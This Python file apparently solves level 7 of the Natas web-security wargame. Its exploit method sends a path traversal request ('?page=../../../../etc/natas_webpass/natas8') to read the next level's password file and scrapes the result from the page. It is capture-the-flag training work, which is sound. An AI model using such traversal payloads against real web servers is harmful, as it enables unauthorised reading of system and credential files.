import re
from src.natas.base_level import NatasLevel
from bs4 import BeautifulSoup

class Level_07(NatasLevel):

  num = 7
  explanation = "On this level a parameter '?page', if we search the html code,\n     we can see a route '/etc/natas_webpass/natas8' were we can find the password."

  def exploit(self) -> str:

    resp  = self.session.get(self.base_url + "?page=../../../../etc/natas_webpass/natas8")
    soup  = BeautifulSoup(resp.text, "html.parser")
    match = soup.find(id = "content").get_text(" ", strip = True).replace("Home", "").replace("About", "").strip()

    return match
